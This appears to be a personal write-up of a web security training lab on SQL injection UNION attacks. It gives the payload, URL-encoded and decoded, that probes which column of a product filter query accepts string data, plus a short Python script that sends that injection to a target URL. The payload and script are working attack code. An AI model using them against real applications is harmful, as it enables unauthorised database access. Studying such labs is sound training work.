This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

---

Payload:
```php
GET /filter?category=Pets'%20UNION%20SELECT%20NULL%2c'TXxfxE'%2cNULL--
```

Decoded:
```php
GET /filter?category=Pets' UNION SELECT NULL,'TXxfxE',NULL--
```

![[Pasted image 20240831060409.png]]

After resetting the lab it asked for a different table name to complete the exercise which is why it is called `F1r6Bt` in the following script. If you want to re-use the script you'll have to change two entries, both values for `F1r6Bt` need to be changed to the new value. 

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def union_atk(s, url):
	exploit_url = url + "filter?category=Pets'%20UNION%20SELECT%20NULL%2c'F1r6Bt'%2cNULL--"
	r = s.get(exploit_url, verify=False, proxies=proxies)
	if 'F1r6Bt' in r.text:
		print('(+) Exploit success!')
		
	else:
		print('(-) Exploit failed.')

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s www.example.com/' % sys.argv[0])
		sys.exit(-1)
		
	s = requests.Session()
	url = sys.argv[1]
	union_atk(s, url)

if __name__ == '__main__':
	main()
```